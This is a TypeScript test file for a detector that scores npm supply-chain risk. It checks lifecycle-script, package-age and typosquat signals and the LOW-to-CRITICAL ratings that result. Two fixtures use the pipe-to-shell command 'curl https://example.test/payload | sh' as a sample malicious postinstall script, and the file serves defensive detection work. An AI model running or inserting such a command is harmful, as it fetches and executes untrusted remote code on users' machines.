import assert from "node:assert/strict";
import { describe, it } from "node:test";

import type { CooldownResult } from "../src/detector/cooldown-checker.ts";
import type { LifecycleScriptsCheckResult } from "../src/detector/lifescycle-script-detector.ts";
import {
    generateRiskReport,
    getRiskRating,
    riskScorer,
    type RiskScorerDependencies,
} from "../src/detector/risk-scorer.ts";

function lifecycleResult(options: {
    hasLifecycleScripts?: boolean;
    suspiciousCommand?: string;
} = {}): LifecycleScriptsCheckResult {
    const suspiciousCommand = options.suspiciousCommand;

    return {
        packageName: "fixture-package",
        version: "1.0.0",
        hasLifecycleScripts:
            options.hasLifecycleScripts ?? Boolean(suspiciousCommand),
        hasSuspiciousScripts: Boolean(suspiciousCommand),
        scripts: {
            preinstall: {
                scriptName: "preinstall",
                exists: false,
                suspicious: false,
                matchedPatterns: [],
            },
            install: {
                scriptName: "install",
                exists: false,
                suspicious: false,
                matchedPatterns: [],
            },
            postinstall: {
                scriptName: "postinstall",
                exists:
                    options.hasLifecycleScripts ??
                    Boolean(suspiciousCommand),
                command:
                    suspiciousCommand ??
                    (options.hasLifecycleScripts
                        ? "node setup.js"
                        : undefined),
                suspicious: Boolean(suspiciousCommand),
                matchedPatterns: suspiciousCommand
                    ? ["remote-script-pipe-to-shell"]
                    : [],
            },
        },
    };
}

function cooldownResult(
    ageDays: number,
    isInCooldown: boolean
): CooldownResult {
    return {
        publishedAt: "2026-07-04T00:00:00.000Z",
        ageDays,
        cooldownDays: 30,
        isInCooldown,
    };
}

function dependencies(options: {
    lifecycle?: LifecycleScriptsCheckResult;
    cooldown?: CooldownResult;
} = {}): Partial<RiskScorerDependencies> {
    return {
        checkLifecycleScripts: async () =>
            options.lifecycle ?? lifecycleResult(),
        checkCooldown: async () =>
            options.cooldown ?? cooldownResult(365, false),
    };
}

describe("generateRiskReport", () => {
    it("returns S/O/D breakdown, RPN, rating, and detector evidence", async () => {
        const report = await generateRiskReport(
            "express",
            "1.0.0",
            { dependencies: dependencies() }
        );

        assert.equal(report.packageName, "express");
        assert.equal(report.version, "1.0.0");
        assert.deepEqual(report.breakdown, {
            severity: 1,
            occurrence: 1,
            detection: 1,
            rawRpn: 1,
            normalizedScore: 1,
        });
        assert.equal(report.riskScore, 1);
        assert.equal(report.rating, "LOW");
        assert.deepEqual(
            report.evidence.map(item => item.detector),
            ["lifecycle-script", "cooldown", "typosquat"]
        );
    });

    it("raises Occurrence for a recently published version", async () => {
        const report = await generateRiskReport(
            "company-internal-ledger-adapter",
            "1.0.0",
            {
                dependencies: dependencies({
                    cooldown: cooldownResult(0.5, true),
                }),
            }
        );

        assert.equal(report.breakdown.occurrence, 5);
        const evidence = report.evidence.find(
            item => item.detector === "cooldown"
        );
        assert.equal(evidence?.scores.occurrence, 5);
        assert.equal(
            (evidence?.details as CooldownResult).ageDays,
            0.5
        );
    });

    it("raises Occurrence and preserves match evidence for a typosquat", async () => {
        const report = await generateRiskReport(
            "expresss",
            "1.0.0",
            { dependencies: dependencies() }
        );

        assert.equal(report.breakdown.occurrence, 4);
        const evidence = report.evidence.find(
            item => item.detector === "typosquat"
        );
        assert.equal(evidence?.scores.occurrence, 4);
        assert.equal(
            (evidence?.details as {
                match?: { referencePackage: string };
            }).match?.referencePackage,
            "express"
        );
    });

    it("rates combined strong signals as CRITICAL", async () => {
        const report = await generateRiskReport(
            "expresss",
            "1.0.0",
            {
                dependencies: dependencies({
                    lifecycle: lifecycleResult({
                        suspiciousCommand:
                            "curl https://example.test/payload | sh",
                    }),
                    cooldown: cooldownResult(0.25, true),
                }),
            }
        );

        assert.deepEqual(report.breakdown, {
            severity: 5,
            occurrence: 5,
            detection: 4,
            rawRpn: 100,
            normalizedScore: 80,
        });
        assert.equal(report.rating, "CRITICAL");
    });

    it("keeps score and rating compatibility wrappers", async () => {
        const options = {
            dependencies: dependencies({
                lifecycle: lifecycleResult({
                    suspiciousCommand:
                        "curl https://example.test/payload | sh",
                }),
            }),
        };

        assert.equal(
            await riskScorer("express", "1.0.0", options),
            64
        );
        assert.equal(
            await getRiskRating("express", "1.0.0", options),
            "HIGH"
        );
    });
});
